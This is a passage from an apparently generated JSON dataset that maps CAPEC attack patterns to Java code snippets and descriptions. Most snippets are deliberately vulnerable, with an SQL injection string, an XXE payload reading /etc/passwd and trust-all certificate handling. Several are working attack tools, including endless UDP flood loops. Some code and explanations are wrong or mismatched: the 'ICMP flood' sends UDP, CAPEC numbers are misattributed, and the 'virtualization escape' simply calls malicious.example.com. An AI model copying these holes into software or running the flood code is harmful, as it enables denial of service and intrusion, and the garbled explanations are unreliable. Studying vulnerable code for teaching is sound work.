        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class CSSInjectionServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String cssUrl = request.getParameter(\"cssUrl\");\n        if (cssUrl != null && !cssUrl.isEmpty()) {\n            // Vulnerable to CSS Injection\n            response.setContentType(\"text/css\");\n            response.getWriter().write(\"@import url('\" + cssUrl + \"');\");\n        } else {\n            response.getWriter().write(\"/* No CSS URL provided */\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Generic Cross-Browser Cross-Domain Theft via CSS injection. The servlet takes a 'cssUrl' parameter from the request and directly includes it in the response as an @import statement in a CSS context. This is vulnerable because it does not properly neutralize the input (CWE-79), allowing an attacker to inject a malicious CSS URL. The attack leverages the browser's behavior of sending cookies with CSS requests and the CSS parser's tolerance for malformed data (CWE-707, CWE-149, CWE-177, CWE-838). This can lead to cross-domain data theft if the injected CSS URL is crafted to exploit these behaviors."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableHttpDoSServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Simulate resource allocation without limits\n        while (true) {\n            // Keep the connection open indefinitely\n            response.getWriter().write(\"Holding connection open...\");\n            response.getWriter().flush();\n            try {\n                Thread.sleep(1000); // Sleep to simulate delay\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to an HTTP DoS attack. The `doGet` method simulates a scenario where the server keeps the HTTP connection open indefinitely by continuously writing to the response and sleeping. This can lead to resource depletion as the server allocates resources for each connection without any limits or throttling (CWE-770). The server does not release the resources after their effective lifetime (CWE-772), and the resource pool can be exhausted (CWE-410), making the server susceptible to a denial of service attack. The code represents the main idea of CAPEC-488, where an attacker can exploit these weaknesses to bring down a web application by keeping multiple HTTP sessions alive indefinitely."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableDatabaseAccess {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Execute a system command (dangerous)\n            String osCommand = \"ls -la\";\n            Runtime.getRuntime().exec(osCommand);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable database access scenario that embodies the main idea of the CAPEC 'Expanding Control over the Operating System from the Database'. The code constructs an SQL query using user input without proper sanitization, leading to a potential SQL Injection vulnerability (CWE-89). The malicious input can alter the SQL command to drop a table. Additionally, the code executes a system command using Runtime.getRuntime().exec(), which can be exploited if the database is compromised, allowing an attacker to execute arbitrary commands on the host operating system. This represents CWE-250 (Execution with Unnecessary Privileges) as the code performs operations at a higher privilege level than necessary. The combination of these vulnerabilities can allow an attacker to gain control over the operating system and potentially attack other machines on the same network."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class SearchOrderHijackingExample {\n    public static void main(String[] args) {\n        String libraryPath = \"./lib/someLibrary.dll\";\n        loadLibrary(libraryPath);\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            // CWE-426: Untrusted Search Path\n            System.load(path);\n        } catch (UnsatisfiedLinkError e) {\n            System.err.println(\"Failed to load library: \" + e.getMessage());\n        }\n    }\n\n    public static void copyLibrary(String source, String destination) {\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            Files.copy(Paths.get(source), Paths.get(destination), StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            System.err.println(\"Failed to copy library: \" + e.getMessage());\n        }\n    }\n\n    public static void unsafeReflection(String className) {\n        try {\n            // CWE-470: Unsafe Reflection\n            Class<?> clazz = Class.forName(className);\n            Object instance = clazz.getDeclaredConstructor().newInstance();\n            System.out.println(\"Loaded class: \" + instance.getClass().getName());\n        } catch (Exception e) {\n            System.err.println(\"Failed to load class: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of Search Order Hijacking by loading a library from a specified path. The `loadLibrary` method uses `System.load` to load a library from a potentially untrusted path (CWE-426). The `copyLibrary` method shows how an attacker could replace a legitimate library with a rogue one by copying it to a controlled location (CWE-427). The `unsafeReflection` method demonstrates the use of externally-controlled input to select and load classes via reflection (CWE-470). This code highlights the risks associated with improper handling of library loading paths and the potential for malicious exploitation."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class BrowserFingerprintingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String referer = request.getHeader(\"Referer\");\n        String acceptLanguage = request.getHeader(\"Accept-Language\");\n\n        // Log the browser fingerprinting information\n        System.out.println(\"User-Agent: \" + userAgent);\n        System.out.println(\"Referer: \" + referer);\n        System.out.println(\"Accept-Language: \" + acceptLanguage);\n\n        // Craft a response that includes the fingerprinting data\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"var userAgent = '\" + userAgent + \"';\");\n        response.getWriter().println(\"var referer = '\" + referer + \"';\");\n        response.getWriter().println(\"var acceptLanguage = '\" + acceptLanguage + \"';\");\n        response.getWriter().println(\"// Exploit code can be added here using the fingerprinting data\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a basic example of browser fingerprinting. The servlet captures the 'User-Agent', 'Referer', and 'Accept-Language' headers from the HTTP request, which are commonly used to identify the browser type and version. This information is logged and then included in the response as part of a JavaScript snippet. The JavaScript snippet can be used to tailor exploit code based on the fingerprinting data. This example embodies the main idea of CAPEC-200 (Browser Fingerprinting) and highlights potential vulnerabilities such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class SignatureSpoofExample {\n    public static void main(String[] args) {\n        String message = \"Important message\";\n        String fakeSignature = generateFakeSignature(message);\n        if (verifySignature(message, fakeSignature)) {\n            System.out.println(\"Message is from a trusted source.\");\n        } else {\n            System.out.println(\"Message is not from a trusted source.\");\n        }\n    }\n\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static String generateFakeSignature(String message) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // MD5 is considered broken\n            byte[] digest = md.digest(message.getBytes());\n            return Base64.getEncoder().encodeToString(digest);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    // CWE-290: Authentication Bypass by Spoofing\n    private static boolean verifySignature(String message, String signature) {\n        // Improper validation of the signature\n        return signature.equals(generateFakeSignature(message));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of message signing and verification, embodying the 'Signature Spoof' CAPEC. The code uses MD5, a broken cryptographic algorithm (CWE-327), to generate a fake signature for a message. The `verifySignature` method improperly validates the signature (CWE-290), allowing an attacker to spoof the signature and trick the system into believing the message is from a trusted source. This example highlights the risks of using weak cryptographic algorithms and improper validation methods, which can lead to authentication bypass and signature spoofing attacks."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class SignatureSpoofing {\n    private static PrivateKey stolenPrivateKey;\n\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair for the original signer\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PublicKey publicKey = keyPair.getPublic();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Simulate theft of the private key\n        stolenPrivateKey = privateKey;\n\n        // Attacker uses the stolen private key to sign a message\n        String message = \"This is a forged message.\";\n        String signature = signMessage(message, stolenPrivateKey);\n\n        // Output the forged signature\n        System.out.println(\"Forged Signature: \" + signature);\n\n        // Verify the signature using the public key\n        boolean isVerified = verifySignature(message, signature, publicKey);\n        System.out.println(\"Signature Verified: \" + isVerified);\n    }\n\n    private static String signMessage(String message, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(message.getBytes());\n        byte[] signedBytes = signature.sign();\n        return Base64.getEncoder().encodeToString(signedBytes);\n    }\n\n    private static boolean verifySignature(String message, String signatureStr, PublicKey publicKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initVerify(publicKey);\n        signature.update(message.getBytes());\n        byte[] signedBytes = Base64.getDecoder().decode(signatureStr);\n        return signature.verify(signedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker steals a private key and uses it to forge a signature, misleading a victim into believing the message is from a legitimate source. The code generates a key pair, simulates the theft of the private key, and then uses the stolen key to sign a message. The forged signature is then verified using the corresponding public key. This example embodies the CAPEC 'Signature Spoofing by Key Theft' and highlights related CWEs such as 'Insufficiently Protected Credentials' (CWE-522) and 'Authentication Bypass by Spoofing' (CWE-290). The code shows how the theft of a private key can lead to unauthorized actions being performed under the guise of a trusted entity."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PublicKey publicKey = keyPair.getPublic();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Create a signature\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String data = \"Sensitive data\";\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n\n        // Verify the signature (vulnerable part)\n        Signature signatureVerify = Signature.getInstance(\"SHA256withRSA\");\n        signatureVerify.initVerify(publicKey);\n        signatureVerify.update(data.getBytes());\n        boolean isValid = signatureVerify.verify(Base64.getDecoder().decode(signedData)); // Incorrectly decoding the signed data\n\n        System.out.println(\"Signature valid: \" + isValid);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of cryptographic signature verification. The code generates a key pair, signs some data, and then attempts to verify the signature. The vulnerability lies in the incorrect decoding of the signed data using Base64.getDecoder().decode(signedData) during the verification process. This improper verification can be exploited by an adversary to spoof the signature, as it does not correctly validate the cryptographic signature. This example embodies the main idea of CAPEC-347 (Signature Spoofing by Improper Validation) and is related to CWE-347 (Improper Verification of Cryptographic Signature) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair for signing\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey publicKey = keyPair.getPublic();\n\n        // Sign the data\n        String data = \"Important data\";\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        String signedDataStr = Base64.getEncoder().encodeToString(signedData);\n\n        // Spoofed signature (attacker's public key)\n        KeyPair attackerKeyPair = keyGen.generateKeyPair();\n        PublicKey attackerPublicKey = attackerKeyPair.getPublic();\n\n        // Verify the signature (incorrectly using attacker's public key)\n        Signature verifySignature = Signature.getInstance(\"SHA256withRSA\");\n        verifySignature.initVerify(attackerPublicKey); // CWE-347: Improper Verification of Cryptographic Signature\n        verifySignature.update(data.getBytes());\n        boolean isVerified = verifySignature.verify(Base64.getDecoder().decode(signedDataStr));\n\n        // Output the result\n        System.out.println(\"Signature verified: \" + isVerified); // This will incorrectly print 'true'\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can spoof a signature by misrepresenting the signer's identity. The code generates a key pair for signing data and then signs the data. However, during the verification process, it incorrectly uses an attacker's public key instead of the legitimate signer's public key (CWE-347: Improper Verification of Cryptographic Signature). This results in the signature being incorrectly verified as valid, demonstrating a signature spoofing attack. The code highlights the importance of correctly verifying cryptographic signatures to prevent such attacks."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        String signedData = \"SignedData\";\n        String unsignedData = \"UnsignedData\";\n\n        // Simulate signed content\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(keyPair.getPrivate());\n        signature.update(signedData.getBytes());\n        byte[] signedBytes = signature.sign();\n        String signedContent = Base64.getEncoder().encodeToString(signedBytes);\n\n        // Mixing signed and unsigned content\n        String mixedContent = signedContent + unsignedData;\n\n        // Simulate verification process\n        signature.initVerify(keyPair.getPublic());\n        signature.update(mixedContent.getBytes());\n        boolean isVerified = signature.verify(Base64.getDecoder().decode(signedContent));\n\n        // Output the result\n        System.out.println(\"Is the mixed content verified? \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can exploit the mixing of signed and unsigned content. The code first generates a signed piece of data using RSA and then appends unsigned data to it. During the verification process, the mixed content is incorrectly processed as if it were entirely signed, leading to a potential security breach. This example embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' and highlights related weaknesses such as improper verification of cryptographic signatures (CWE-347) and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class ModifyWindowsServiceConfig {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"C:\\\\Windows\\\\System32\\\\service.exe\";\n        String maliciousBinaryPath = \"C:\\\\malicious.exe\";\n\n        try {\n            // Improper Access Control: Overwriting the service executable\n            Files.copy(Paths.get(maliciousBinaryPath), Paths.get(serviceConfigPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n\n            // External Control of System or Configuration Setting: Changing file permissions\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(Paths.get(serviceConfigPath), perms);\n\n            System.out.println(\"Service configuration modified to execute malicious binary.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify the configuration of a Windows service to execute a malicious binary. The code performs the following actions:\n\n1. **Improper Access Control (CWE-284)**: The code copies a malicious binary over the existing service executable, exploiting weak access controls.\n2. **External Control of System or Configuration Setting (CWE-15)**: The code changes the file permissions of the service executable to allow full access, which can be externally controlled by a user.\n\nThe main idea of the CAPEC is represented by the ability to modify the execution parameters of a Windows service to execute a malicious binary, leveraging weaknesses in access control and configuration settings."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.X509TrustManager;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class VulnerableSSL {\n    public static void main(String[] args) throws Exception {\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public X509Certificate[] getAcceptedIssuers() { return null; }\n                public void checkClientTrusted(X509Certificate[] certs, String authType) { }\n                public void checkServerTrusted(X509Certificate[] certs, String authType) { }\n            }\n        };\n\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n\n        // This will connect to a server without validating its certificate\n        HttpsURLConnection connection = (HttpsURLConnection) new java.net.URL(\"https://example.com\").openConnection();\n        connection.connect();\n        System.out.println(\"Connected to https://example.com\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS configuration where the SSL/TLS certificate validation is improperly handled. The custom TrustManager implementation trusts all certificates without performing any validation checks, which embodies the main idea of the CAPEC 'Malicious Root Certificate'. This vulnerability is related to several CWEs, including CWE-295 (Improper Certificate Validation) and CWE-296 (Improper Following of a Certificate's Chain of Trust). The code allows an adversary to install a malicious root certificate and intercept HTTPS connections without triggering security warnings, potentially leading to credential theft or other attacks."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VirtualizationEscape {\n    public static void main(String[] args) {\n        try {\n            // Simulate a virtualized environment by running a command\n            Process process = Runtime.getRuntime().exec(\"ls\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // Vulnerability: Improper isolation allows escape to host environment\n            // Execute a command on the host environment\n            URL url = new URL(\"http://malicious.example.com/execute?cmd=whoami\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            while ((line = in.readLine()) != null) {\n                System.out.println(line);\n            }\n            in.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can escape a virtualized environment and execute unauthorized commands on the host system. The code first simulates a virtualized environment by running a simple 'ls' command. It then shows a vulnerability where improper isolation allows the attacker to execute a command on the host environment by making an HTTP request to a malicious URL. This represents the CAPEC 'Escaping Virtualization' and highlights related CWEs such as 'Improper Isolation or Compartmentalization' (CWE-653) and 'Process Control' (CWE-114). The code is vulnerable because it does not properly isolate the virtualized environment from the host, allowing unauthorized access and execution of commands."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class DomainFrontingExample {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"https://example.com/resource\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Host\", \"malicious.com\"); // CWE-941: Incorrectly Specified Destination\n        connection.setRequestProperty(\"SNI\", \"example.com\"); // CWE-923: Improper Restriction of Communication Channel\n\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simplified example of the 'Contradictory Destinations in Traffic Routing Schemes' attack, specifically using the Domain Fronting technique. The code sets up an HTTP connection to 'https://example.com/resource' but manipulates the 'Host' header to 'malicious.com' and the 'SNI' (Server Name Indication) field to 'example.com'. This can cause the traffic to be routed incorrectly, potentially to a malicious endpoint. The code embodies CWE-941 by incorrectly specifying the destination and CWE-923 by not properly restricting the communication channel to the intended endpoint. This example highlights how an attacker can exploit contradictory domain names to misroute traffic."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class VulnerableTCPFloodServer {\n    private static final int PORT = 8080;\n    private static final int MAX_CONNECTIONS = 1000; // CWE-770: No limit on resource allocation\n    private static ExecutorService executor = Executors.newFixedThreadPool(MAX_CONNECTIONS);\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                executor.submit(() -> handleClient(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // CWE-319: Cleartext transmission of sensitive information\n            clientSocket.getOutputStream().write(\"Welcome to the server!\".getBytes());\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable TCP server that is susceptible to a TCP flood attack. The server listens on port 8080 and uses a fixed thread pool to handle incoming connections. However, it does not impose any restrictions on the number of connections (CWE-770), making it vulnerable to resource exhaustion. Additionally, the server sends a welcome message in cleartext (CWE-319), which can be intercepted by unauthorized actors. This code embodies the main idea of the CAPEC by demonstrating how an adversary can exploit the lack of resource limits and cleartext transmission to deny legitimate users access to the service."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void validateXML(String xmlInput) throws SAXException, IOException {\n        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n        Schema schema = factory.newSchema();\n        Validator validator = schema.newValidator();\n        validator.validate(new StreamSource(new StringReader(xmlInput)));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML External Entity (XXE) attacks. The code attempts to parse an XML input that includes an external entity reference to a local file. The DocumentBuilderFactory is configured with secure processing, but the code does not properly validate the XML against a schema, nor does it disable external entity resolution. This can lead to the inclusion of unintended external content, such as the contents of the /etc/passwd file, into the parsed XML. This example embodies the main idea of the deprecated CAPEC-230 and CAPEC-231, highlighting the importance of proper XML validation and secure configuration to prevent such attacks."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class SignatureSpoofing {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair using a predictable random number generator\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        SecureRandom predictableRandom = new SecureRandom(new byte[]{1, 2, 3, 4}); // CWE-330, CWE-1241\n        keyGen.initialize(2048, predictableRandom);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Sign a message\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String message = \"This is a secret message\";\n        signature.update(message.getBytes());\n        byte[] signedMessage = signature.sign();\n        String encodedSignature = Base64.getEncoder().encodeToString(signedMessage);\n\n        System.out.println(\"Signed Message: \" + encodedSignature);\n\n        // An attacker can recreate the private key using the predictable random number generator\n        KeyPair attackerKeyPair = keyGen.generateKeyPair();\n        PrivateKey attackerPrivateKey = attackerKeyPair.getPrivate();\n\n        // Attacker signs a forged message\n        signature.initSign(attackerPrivateKey);\n        String forgedMessage = \"This is a forged message\";\n        signature.update(forgedMessage.getBytes());\n        byte[] forgedSignedMessage = signature.sign();\n        String encodedForgedSignature = Base64.getEncoder().encodeToString(forgedSignedMessage);\n\n        System.out.println(\"Forged Signed Message: \" + encodedForgedSignature);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can spoof a signature by recreating the private key using a predictable random number generator. The code first generates a key pair using a predictable random number generator (CWE-330, CWE-1241). It then signs a message with the generated private key. An attacker, knowing the predictable random number generator, can recreate the same private key and use it to sign a forged message. This demonstrates the main idea of CAPEC-167: 'Signature Spoofing by Key Recreation', where the attacker exploits a cryptographic weakness to forge signatures."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        if (args.length < 2) {\n            System.out.println(\"Usage: java UDPFlood <target IP> <target port>\");\n            return;\n        }\n\n        String targetIP = args[0];\n        int targetPort = Integer.parseInt(args[1]);\n        byte[] buffer = new byte[1024]; // CWE-770: No limit on resource allocation\n\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n        DatagramSocket socket = new DatagramSocket();\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet); // CWE-406: No control over network message volume\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP flood attack. The program sends a continuous stream of UDP packets to a specified target IP and port, consuming network bandwidth and potentially overwhelming the target service. The code lacks resource allocation limits (CWE-770) and does not control the volume of network messages (CWE-406), making it a clear example of a UDP flood attack as described in the CAPEC. The absence of destination verification (CWE-941) and message integrity checks (CWE-924) further exacerbates the potential for misuse and attack."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpFlood {\n    public static void main(String[] args) throws IOException {\n        InetAddress target = InetAddress.getByName(\"192.168.1.1\"); // CWE-941: Incorrectly Specified Destination\n        byte[] buffer = new byte[65507]; // CWE-770: Allocation of Resources Without Limits\n        DatagramSocket socket = new DatagramSocket();\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 7); // CWE-923: Improper Restriction of Communication Channel\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP flood attack, where a target server (192.168.1.1) is bombarded with ICMP packets. The code continuously sends large packets to the target, consuming network bandwidth and potentially causing a denial of service. The code embodies CWE-770 by allocating a large buffer without limits, CWE-941 by specifying a potentially incorrect destination, and CWE-923 by not properly restricting the communication channel. This example highlights the vulnerabilities that can be exploited in an ICMP flood attack."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No rate limiting or resource allocation checks\n        String sensitiveData = request.getParameter(\"sensitiveData\"); // CWE-598: Sensitive data in query string\n        response.getWriter().append(\"Sensitive Data: \").append(sensitiveData);\n\n        // Simulate resource-intensive operation\n        try {\n            Thread.sleep(1000); // CWE-770: No throttling, can be exploited for HTTP Flood\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
